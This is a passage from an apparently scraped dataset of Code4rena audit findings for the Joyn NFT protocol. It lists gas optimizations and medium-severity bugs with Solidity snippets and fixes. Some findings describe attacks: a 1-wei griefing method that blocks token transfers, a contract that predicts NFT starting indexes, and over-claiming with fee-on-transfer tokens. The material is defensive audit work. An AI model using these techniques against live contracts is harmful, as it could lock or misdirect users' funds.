Collection[] memory _collections\n  ) external onlyAvailableProject(_projectId) {\n```\n\n12. File: core-contracts/contracts/CoreFactory.sol (lines [108-111](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L108-L111))\n\n```solidity\n  function addCollection(\n    string memory _projectId,\n    Collection memory _collection\n  ) external onlyProjectOwner(_projectId) returns (address) {\n```\n\n13. File: core-contracts/contracts/CoreFactory.sol (lines [142-145](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L142-L145))\n\n```solidity\n  function _createCollection(Collection memory _collection)\n    private\n    onlyAvailableCollection(_collection.id)\n    returns (address)\n```\n\n14. File: royalty-vault/contracts/RoyaltyVault.sol (line [67](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L67))\n\n```solidity\n    function setPlatformFee(uint256 _platformFee) external override onlyOwner {\n```\n\n15. File: royalty-vault/contracts/RoyaltyVault.sol (lines [76-79](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L76-L79))\n\n```solidity\n    function setPlatformFeeRecipient(address _platformFeeRecipient)\n        external\n        override\n        onlyOwner\n```\n\n16. File: splits/contracts/SplitFactory.sol (lines [75-80](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L75-L80))\n\n```solidity\n  function createSplit(\n    bytes32 _merkleRoot,\n    address _splitAsset,\n    address _collectionContract,\n    string memory _splitId\n  ) external onlyAvailableSplit(_splitId) returns (address splitProxy) {\n```\n\n17. File: splits/contracts/SplitFactory.sol (lines [102-106](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L102-L106))\n\n```solidity\n  function createSplit(\n    bytes32 _merkleRoot,\n    address _splitAsset,\n    string memory _splitId\n  ) external onlyAvailableSplit(_splitId) returns (address splitProxy) {\n```\n\n18. File: splits/contracts/SplitFactory.sol (lines [120-122](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L120-L122))\n\n```solidity\n  function setPlatformFee(address _vault, uint256 _platformFee)\n    external\n    onlyOwner\n```\n\n19. File: splits/contracts/SplitFactory.sol (lines [132-135](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L132-L135))\n\n```solidity\n  function setPlatformFeeRecipient(\n    address _vault,\n    address _platformFeeRecipient\n  ) external onlyOwner {\n```\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/56#issuecomment-1100207292):**\n > high quality report\n\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-21-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4323",
      "title": "[G-20] Use custom errors rather than `revert()`/`require()` strings to save deployment gas",
      "impact": "GAS",
      "content": "\n1.  File: royalty-vault/contracts/RoyaltyVault.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol))\n2.  File: splits/contracts/SplitFactory.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol))\n3.  File: splits/contracts/Splitter.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol))\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-20-use-custom-errors-rather-than-revertrequire-strings-to-save-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4319",
      "title": "[G-16] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "\n1.  File: royalty-vault/contracts/ProxyVault.sol (line [9](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/ProxyVault.sol#L9))\n\n```solidity\n    address internal royaltyVault;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-16-state-variables-only-set-in-the-constructor-should-be-declared-immutable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4318",
      "title": "[G-15] Remove unused variables",
      "impact": "GAS",
      "content": "\n1.  File: splits/contracts/Splitter.sol (line [14](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L14))\n\n```solidity\n    uint256 public constant PERCENTAGE_SCALE = 10e5;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-15-remove-unused-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "4317",
      "title": "[G-14] Don't compare boolean expressions to boolean literals",
      "impact": "GAS",
      "content": "\n`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n1.  File: royalty-vault/contracts/RoyaltyVault.sol (line [44](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L44))\n\n```solidity\n            IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,\n```\n\n2.  File: royalty-vault/contracts/RoyaltyVault.sol (line [48](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L48))\n\n```solidity\n            ISplitter(splitterProxy).incrementWindow(splitterShare) == true,\n```\n\n3.  File: royalty-vault/contracts/RoyaltyVault.sol (lines [52-55](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L52-L55))\n\n```solidity\n            IERC20(royaltyAsset).transfer(\n                platformFeeRecipient,\n                platformShare\n            ) == true,\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-14-dont-compare-boolean-expressions-to-boolean-literals",
      "tags": [],
      "finders": []
    },
    {
      "id": "4315",
      "title": "[G-12] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\n> When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n<https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html>\nUse a larger size then downcast where needed\n\n1.  File: splits/contracts/Splitter.sol (line [217](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L217))\n\n```solidity\n    function amountFromPercent(uint256 amount, uint32 percent)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-12-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4311",
      "title": "[G-08] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second access of a state variable within a function.\nLess obvious optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, or having local caches of state variable contracts/addresses.\n\n1.  File: core-contracts/contracts/CoreCollection.sol (line [231](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L231))\n\n```solidity\n        emit StartingIndexSet(startingIndex);\n```\n\n2.  File: core-contracts/contracts/CoreCollection.sol (line [264](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L264))\n\n```solidity\n        tokenId = ((startingIndex + totalSupply()) % maxSupply) + 1;\n```\n\n3.  File: splits/contracts/SplitFactory.sol (line [161](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L161))\n\n```solidity\n    delete merkleRoot;\n```\n\n4.  File: splits/contracts/SplitFactory.sol (line [171](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L171))\n\n```solidity\n    delete splitterProxy;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-08-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "4310",
      "title": "[G-07] It costs more gas to initialize variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\n1.  File: core-contracts/contracts/CoreCollection.sol (line [279](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L279))\n\n```solidity\n        for (uint256 i = 0; i < _amount; i++) {\n```\n\n2.  File: splits/contracts/Splitter.sol (line [49](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L49))\n\n```solidity\n        uint256 amount = 0;\n```\n\n3.  File: splits/contracts/Splitter.sol (line [50](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L50))\n\n```solidity\n        for (uint256 i = 0; i < currentWindow; i++) {\n```\n\n4.  File: splits/contracts/Splitter.sol (line [274](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L274))\n\n```solidity\n        for (uint256 i = 0; i < proof.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-07-it-costs-more-gas-to-initialize-variables-to-zero-than-to-let-the-default-of-zero-be-applied",
      "tags": [],
      "finders": []
    },
    {
      "id": "1772",
      "title": "[M-12] `CoreCollection.setRoyaltyVault` doesn't check `royaltyVault.royaltyAsset` against `payableToken`, resulting in potential permanent lock of `payableTokens` in royaltyVault",
      "impact": "MEDIUM",
      "content": "_Submitted by rayn_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L185>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/ERC721Payable.sol#L50>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L31>\n\n### Impact\n\nEach CoreProxy is allowed to be associated with a RoyaltyVault, the latter which would be responsible for collecting minting fees and distributing to beneficiaries. Potential mismatch between token used in CoreProxy and RoyaltyVault might result in minting tokens being permanently stuck in RoyaltyVault.\n\n### Proof of Concept\n\nEach RoyaltyVault can only handle the `royaltyVault.royaltyAsset` token assigned upon creation, if any other kind of tokens are sent to the vault, it would get stuck inside the vault forever.\n\n        function sendToSplitter() external override {\n            ...\n            require(\n                IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,\n                \"Failed to transfer royalty Asset to splitter\"\n            );\n            ...\n            require(\n                IERC20(royaltyAsset).transfer(\n                    platformFeeRecipient,\n                    platformShare\n                ) == true,\n                \"Failed to transfer royalty Asset to platform fee recipient\"\n            );\n            ...\n        }\n\nConsidering that pairing of CoreProxy and RoyaltyVault is not necessarily handled automatically, and can sometimes be manually assigned, and further combined with the fact that once assigned, CoreProxy does not allow modifications of the pairing RoyaltyVault. We can easily conclude that if a CoreProxy is paired with an incompatible RoyaltyVault, the `payableToken` minting fees automatically transferred to RoyaltyVault by `_handlePayment` will get permanently stuck.\n\n         function setRoyaltyVault(address _royaltyVault)\n             external\n             onlyVaultUninitialized\n         {\n             ...\n             royaltyVault = _royaltyVault;\n             ...\n         }\n\n         function _handlePayment(uint256 _amount) internal {\n             address recipient = royaltyVaultInitialized()\n                 ? royaltyVault\n                 : address(this);\n             payableToken.transferFrom(msg.sender, recipient, _amount);\n             ...\n         }\n\n### Tools Used\n\nvim, ganache-cli\n\n### Recommended Mitigation Steps\n\nWhile assigning vaults to CoreProxy, check if `payableToken` is the same as `royaltyVault.royaltyAsset`\n\n         function setRoyaltyVault(address _royaltyVault)\n             external\n             onlyVaultUninitialized\n         {\n             require(\n                 payableToken == _royaltyVault.royaltyAsset(),\n                 \"CoreCollection : payableToken must be same as royaltyAsset.\"\n             );\n             ...\n             royaltyVault = _royaltyVault;\n             ...\n         }\n\n**[sofianeOuafir (Joyn) confirmed](https://github.com/code-423n4/2022-03-joyn-findings/issues/73)** \n\n**[deluca-mike (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/73#issuecomment-1153010132):**\n > Downgraded to medium because, while a more automated and validated way of assigning a compatible royalty vault would prevent this issue, in the current framework you'd need to make a user error (albeit one that is not easy to spot), to lose funds.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the CoreCollection, ERC721Payable and RoyaltyVault contracts. The vulnerability can lead to minting fees being permanently stuck in the RoyaltyVault if the CoreProxy and RoyaltyVault are paired with an incompatible token. This is because the CoreProxy does not allow modifications of the pairing RoyaltyVault once assigned.\n\nThe Proof of Concept shows that if any other kind of tokens are sent to the RoyaltyVault, it would get stuck inside the vault forever. This is because the RoyaltyVault can only handle the `royaltyVault.royaltyAsset` token assigned upon creation.\n\nThe tools used to find this vulnerability were vim and ganache-cli.\n\nThe recommended mitigation step is to check if the `payableToken` is the same as `royaltyVault.royaltyAsset` when assigning vaults to CoreProxy. This can be done by adding a `require` statement in the `setRoyaltyVault` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/73",
      "tags": [],
      "finders": [
        "rayn"
      ]
    },
    {
      "id": "1771",
      "title": "[M-11] Not handling return value of transferFrom command can create inconsistency",
      "impact": "MEDIUM",
      "content": "_Submitted by hubble_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L175-L176>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Payable.sol#L54-L55>\n\n### Vulnerability details\n\nThe below transferFrom command is called at two places in the core contracts, followed by an emit event\n\n    payableToken.transferFrom(msg.sender,recipient,_amount)\n    emit ...(...);\n\nThe return value is not checked during the payableToken.transferFrom\n\n### Impact\n\nIn the event of failure of payableToken.transferFrom(...), the emit event is still generated causing the downstream applications to capture\nwrong transaction / state of the protocol.\n\n### Proof of Concept\n\n1.  Contract CoreCollection.sol\\\n    function withdraw()\n\n2.  Contract ERC721Payable.sol\n    function \\_handlePayment\n\n### Recommended Mitigation Steps\n\nAdd a require statement as being used in the RoyaltyVault.sol\n\n    require( payableToken.transferFrom(msg.sender,recipient,_amount) == true,\n                \"Failed to transfer amount to recipient\" );\n\n\n**[sofianeOuafir (Joyn) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/81#issuecomment-1099290275):**\n > In my opinion, the severity level should be 3 (High Risk) instead of 2 (Med Risk)\n> duplicate of #52 \n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/81#issuecomment-1153003465):**\n > No longer a duplicate because this issue pertains specifically to the false emission of events when an underlying call would have failed.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the transferFrom command in two contracts, CoreCollection.sol and ERC721Payable.sol. The return value of the transferFrom command is not checked, which can lead to downstream applications capturing wrong transaction or state of the protocol. The recommended mitigation step is to add a require statement at the end of the transferFrom command, to ensure that the transfer is successful. This will help prevent any downstream applications from capturing incorrect transaction or state of the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/81",
      "tags": [],
      "finders": [
        "hubble"
      ]
    },
    {
      "id": "1770",
      "title": "[M-10] Add a timelock to `setPlatformFee()`",
      "impact": "MEDIUM",
      "content": "_Submitted by Dravee_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/SplitFactory.sol#L120>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L67>\n\n### Impact\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.\n\nHere, no timelock capabilities seem to be used\n\nI believe this impacts multiple users enough to make them want to react / be notified ahead of time.\n\n### Recommended Mitigation Steps\n\nConsider adding a timelock to `setPlatformFee()`\n\n**[sofianeOuafir (Joyn) acknowledged and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/112#issuecomment-1099708757):**\n > This is a good idea. We will consider mitigating this but at the same time it might not be something we will solve \n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns two lines of code on two separate files in a GitHub repository: SplitFactory.sol on line 120 and RoyaltyVault.sol on line 67. The vulnerability is that no timelock capabilities are used, which impacts multiple users who may want to be notified ahead of time of any critical changes. The recommended mitigation step is to add a timelock to the function setPlatformFee(). Adding a timelock to this function would provide more guarantees and reduce the level of trust required, thus decreasing risk for users. It would also indicate that the project is legitimate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/112",
      "tags": [],
      "finders": [
        "Dravee"
      ]
    },
    {
      "id": "1769",
      "title": "[M-09] Differing percentage denominators causes confusion and potentially brick claims",
      "impact": "MEDIUM",
      "content": "_Submitted by hickuphh3, also found by 0x_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L14>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L103>\n\n### Details & Impact\n\nThere is a `PERCENTAGE_SCALE = 10e5` defined, but the actual denominator used is `10000`. This is aggravated by the following factors:\n\n1.  Split contracts are created by collection owners, not the factory owner. Hence, there is a likelihood for someone to mistakenly use `PERCENTAGE_SCALE` instead of `10000`.\n2.  The merkle root for split distribution can only be set once, and a collectionâ€™s split and royalty vault canâ€™t be changed once created.\n\nThus, if an incorrect denominator is used, the calculated claimable amount could exceed the actual available funds in the contract, causing claims to fail and funds to be permanently locked.\n\n### Recommended Mitigation Steps\n\nRemove `PERCENTAGE_SCALE` because it is unused, or replace its value with `10_000` and use that instead.\n\nP.S: there is an issue with the example scaled percentage given for platform fees `(5% = 200)`. Should be `500` instead of `200`.\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/53#issuecomment-1100123940):**\n > This is an issue and we intend to fix it\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Splitter.sol contract in the code-423n4/2022-03-joyn GitHub repository. The vulnerability is caused by the use of an incorrect denominator which could lead to the calculated claimable amount exceeding the actual available funds in the contract. This can lead to claims failing and funds being permanently locked. The recommended mitigation steps are to either remove the unused PERCENTAGE_SCALE or replace its value with 10_000 and use that instead. Additionally, there is an issue with the example scaled percentage given for platform fees which should be 500 instead of 200.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/53",
      "tags": [],
      "finders": [
        "0x",
        "hickuphh3"
      ]
    },
    {
      "id": "1768",
      "title": "[M-08] CoreCollection: Starting index is pseudo-randomly generated, allowing for gameable NFT launches",
      "impact": "MEDIUM",
      "content": "_Submitted by hickuphh3_\n\nIn Paradigmâ€™s article *[â€œA Guide to Designing Effective NFT Launchesâ€](https://www.paradigm.xyz/2021/10/a-guide-to-designing-effective-nft-launches),* one of the desirable properties of an NFT launch is **unexploitable fairness:** Launches *must* have true randomness to ensure that predatory users cannot snipe the rarest items at the expense of less sophisticated users.\n\nIt is therefore highly recommended to find a good source of entropy for the generation of the starting index. The `block.number` isnâ€™t random at all; it only incrementally increases, allowing anyone to easily compute the starting indexes of the next 10,000 blocks for instance.\n\n```jsx\ncontract FortuneTeller {\n  function predictStartingIndexes(uint256 maxSupply, uint256 numBlocks) \n    external\n    view\n    returns \n    (uint256[] memory startingIndexes) {\n    startingIndexes = new uint[](numBlocks);\n    for (uint256 i = 0; i < numBlocks; ++i) {\n        startingIndexes[i] = (uint256(\n            keccak256(abi.encodePacked(\"CoreCollection\", block.number + i))\n        ) % maxSupply) +\n        1;\n    }\n  }\n}\n```\n\nCoupled with the fact that the `_baseUri` is set upon initialization, the metadata could be scrapped beforehand to determine the rare NFTs.\n\nThus, NFT mints can be gamed / exploited.\n\n### Recommended Mitigation Steps\n\nConsider exploring the use of commit-reveal schemes (eg. blockhash of a future block, less gameable but not foolproof) or VRFs.\n\n**[sofianeOuafir (Joyn) acknowledged and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/50#issuecomment-1100122798):**\n > This is a known issue and for now, we're not going to solve it\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/50#issuecomment-1106006297):**\n > I'd reconsider not completely it, but rather doing `keccak256(abi.encodePacked(\"CoreCollection\", blockhash(block.number - 1), block.coinbase, msg.sender, i))` so at least there is a much smaller set of users that will know what the previous blockhash and the current miner will be by the time the tx mines, and it will be salted with the sender.\n> \n> It's not perfect, but it's significantly better.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed regarding the CoreCollection.sol file in the 2022-03-joyn repository of the code-423n4 Github. This bug is related to the unpredictability of the NFT launch, which is a desirable property for NFT launches. The source of entropy used in the CoreCollection.sol file, the block.number, is not random and can be easily predicted, allowing anyone to easily compute the starting indexes of the next 10,000 blocks. Coupled with the fact that the _baseUri is set upon initialization, the metadata can be scraped beforehand to determine the rare NFTs, thus allowing NFT mints to be exploited.\n\nThe recommended mitigation steps for this bug are to explore the use of commit-reveal schemes (eg. blockhash of a future block, less gameable but not foolproof) or VRFs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/50",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "1767",
      "title": "[M-07] Ineffective Handling of FoT or Rebasing Tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird, also found by defsec, hickuphh3, and leastwood_\n\nCertain ERC20 tokens may change user's balances over time (positively or negatively) or charge a fee when a transfer is called (FoT tokens). The accounting of these tokens is not handled by `RoyaltyVault.sol` or `Splitter.sol` and may result in tokens being stuck in `Splitter` or overstating the balance of a user\n\nThus, for FoT tokens if all users tried to claim from the Splitter there would be insufficient funds and the last user could not withdraw their tokens.\n\n### Proof of Concept\n\nThe function `RoyaltyVault.sendToSplitter()` will transfer `splitterShare` tokens to the `Splitter` and then call `incrementWindow(splitterShare)` which tells the contract to split `splitterShare` between each of the users.\n\n            require(\n                IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,\n                \"Failed to transfer royalty Asset to splitter\"\n            );\n            require(\n                ISplitter(splitterProxy).incrementWindow(splitterShare) == true,\n                \"Failed to increment splitter window\"\n            );\n\nSince the `Splitter` may receive less than `splitterShare` tokens if there is a fee on transfer the `Splitter` will overstate the amount split and each user can claim more than their value (except the last user who claims nothing as the contract will have insufficient funds to transfer them the full amount).\n\nFurthermore, if the token rebase their value of the tokens down while they are sitting in the `Splitter` the same issue will occur. If the tokens rebase their value up then this will not be accounted for in the protocol.\n\n### Recommended Mitigation Steps\n\nIt is recommend documenting clearly that rebasing token should not be used in the protocol.\n\nAlternatively, if it is a requirement to handle rebasing tokens balance checks should be done before and after the transfer to ensure accurate accounting. Note: this makes the contract vulnerable to reentrancy and so a [reentrancy guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) must be placed over the function `sendToSplitter()`.\n\n            uint256 balanceBefore = IERC20(royaltyAsset).balanceOf(splitterProxy);\n            require(\n                IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,\n                \"Failed to transfer royalty Asset to splitter\"\n            );\n            uint256 balanceAfter = IERC20(royaltyAsset).balanceOf(splitterProxy);\n            require(\n                ISplitter(splitterProxy).incrementWindow(balanceAfter - balanceBefore) == true,\n                \"Failed to increment splitter window\"\n            );\n\n**[sofianeOuafir (Joyn) confirmed](https://github.com/code-423n4/2022-03-joyn-findings/issues/43)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the RoyaltyVault.sol and Splitter.sol smart contracts. Certain ERC20 tokens may change user's balances over time or charge a fee when a transfer is called (FoT tokens). The accounting of these tokens is not handled by RoyaltyVault.sol or Splitter.sol and may result in tokens being stuck in Splitter or overstating the balance of a user. This could cause a problem if all users try to claim from the Splitter, as there would be insufficient funds and the last user could not withdraw their tokens.\n\nThe suggested mitigation steps are to document that rebasing tokens should not be used in the protocol, or if it is a requirement, to do balance checks before and after the transfer to ensure accurate accounting. A reentrancy guard must also be placed over the function sendToSplitter() in this case.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/43",
      "tags": [],
      "finders": [
        "leastwood",
        "hickuphh3",
        "kirk-baird",
        "defsec"
      ]
    },
    {
      "id": "1766",
      "title": "[M-06] CoreCollection's token transfer can be disabled",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by robee_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L164>\n\n### Impact\n\nWhen royaltyAsset is an ERC20 that doesn't allow zero amount transfers, the following griefing attack is possible, entirely disabling CoreCollection token transfer by precision degradation as both reward distribution and vault balance can be manipulated.\n\nSuppose splitterProxy is set, all addresses and fees are configured correctly, system is in normal operating state.\n\nPOC:\n\nBob the attacker setup a bot which every time it observes positive royaltyVault balance:\n\n1.  runs `sendToSplitter()`, distributing the whole current royaltyAsset balance of the vault to splitter and platform, so vault balance becomes zero\n\n2.  sends `1 wei` of royaltyAsset to the royaltyVault balance\n\n3.  each next CoreCollection token transfer will calculate `platformShare = (balanceOfVault * platformFee) / 10000`, which will be 0 as platformFee is supposed to be less than 100%, and then there will be an attempt to transfer it to `platformFeeRecipient`\n\nIf royaltyAsset reverts on zero amount transfers, the whole operation will fail as the success of `IERC20(royaltyAsset).transfer(platformFeeRecipient, platformShare)` is required for each CoreCollection token transfer, which invokes `sendToSplitter()` in `_beforeTokenTransfer()` as vault balance is positive in (3).\n\nNotice, that Bob needn't to front run the transfer, it is enough to empty the balance in a lazy way, so cumulative gas cost of the attack can be kept moderate.\n\nSetting severity to medium as on one hand, the attack is easy to setup and completely blocks token transfers, making the system inoperable, and it looks like system has to be redeployed on such type of attack with some manual management of user funds, which means additional operational costs and reputational damage. On the another, it is limited to the zero amount reverting royaltyAsset case or the case when platformFee is set to 100%.\n\nThat is, as an another corner case, if platformFee is set to 100%, `platformShare` will be `1 wei` and `splitterShare` be zero in 